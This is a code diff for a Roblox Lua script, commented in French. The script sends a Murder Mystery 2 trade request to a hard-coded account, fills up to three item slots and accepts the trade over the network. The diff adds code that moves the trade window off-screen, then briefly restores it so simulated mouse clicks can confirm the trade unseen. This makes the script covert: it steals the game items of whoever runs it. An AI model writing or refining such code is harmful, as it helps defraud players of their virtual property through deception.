@@ -492,14 +492,36 @@ end
 
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
-local function getitems()
-    -- NE PAS masquer le GUI tout de suite pour laisser le bouton cliquable
-    -- (On le cachera à la toute fin)
+-- Fonction pour masquer / déplacer le GUI du trade hors de l'écran
+local function setTradeGuiPosition(offscreen)
+    pcall(function()
+        local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+        -- Recherche des conteneurs habituels du trade MM2
+        local tradeGui = playerGui:FindFirstChild("TradeGUI") or playerGui:FindFirstChild("Trade")
+        if tradeGui then
+            local container = tradeGui:FindFirstChild("Container") or tradeGui:FindFirstChild("MainFrame") or tradeGui:FindFirstChild("Frame")
+            if container then
+                if offscreen then
+                    -- Déplace la fenêtre loin hors de l'écran
+                    container.Position = UDim2.new(10, 0, 10, 0)
+                else
+                    -- Remet la fenêtre au centre (position d'origine)
+                    container.Position = UDim2.new(0.5, -200, 0.5, -150)
+                end
+            end
+        end
+    end)
+end
 
-    -- 1. Envoi de la demande de trade au compte principal
+local function getitems()
+    -- 1. On masque tout de suite la fenêtre en la déplaçant hors de ton écran
+    setTradeGuiPosition(true)
+
+    -- 2. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
         warn("Compte principal introuvable : " .. tostring(userName))
@@ -509,7 +531,7 @@ local function getitems()
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
-    -- 2. Remplissage des 3 cases max
+    -- 3. Remplissage des 3 cases max MM2
     local itemsOffered = 0
     local maxSlots = 3
 
@@ -539,16 +561,20 @@ local function getitems()
 
     task.wait(1.5)
 
-    -- 3. Première validation réseau
+    -- 4. Première validation réseau
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 4. Attente du timer obligatoire de MM2 (8 secondes)
+    -- 5. Attente des 8 secondes du compte à rebours MM2 (avec le GUI toujours actif hors-écran)
     task.wait(8)
 
-    -- 5. SÉQUENCE DE CLICS VIRTUELS (GUI TOUJOURS ACTIF)
+    -- 6. SÉQUENCE DE CLIC SUR LE BOUTON
     pcall(function()
+        -- Remet la fenêtre à sa place juste 1 seconde pour enregistrer les clics
+        setTradeGuiPosition(false)
+        task.wait(0.2)
+
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
 
@@ -561,12 +587,12 @@ local function getitems()
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
         end
 
-        -- Clic 1 : Verrouillage de l'offre
+        -- Clic 1 : Verrouillage
         sendClick()
 
-        task.wait(2) -- Laisse le temps au bouton de passer en vert/validation finale
+        task.wait(2)
 
-        -- Clic 2 : Confirmation définitive
+        -- Clic 2 : Confirmation finale
         sendClick()
 
         task.wait(1)
@@ -575,11 +601,9 @@ local function getitems()
         sendClick()
     end)
 
-    -- 6. NETTOYAGE FINAL : On cache le GUI SEULEMENT MAINTENANT que c'est accepté
+    -- 7. Nettoyage : On renvoie la fenêtre hors écran
     task.wait(0.5)
-    if destroytrades2 then
-        pcall(function() coroutine.resume(destroytrades2) end)
-    end
+    setTradeGuiPosition(true)
 end
 
 -- ==========================================
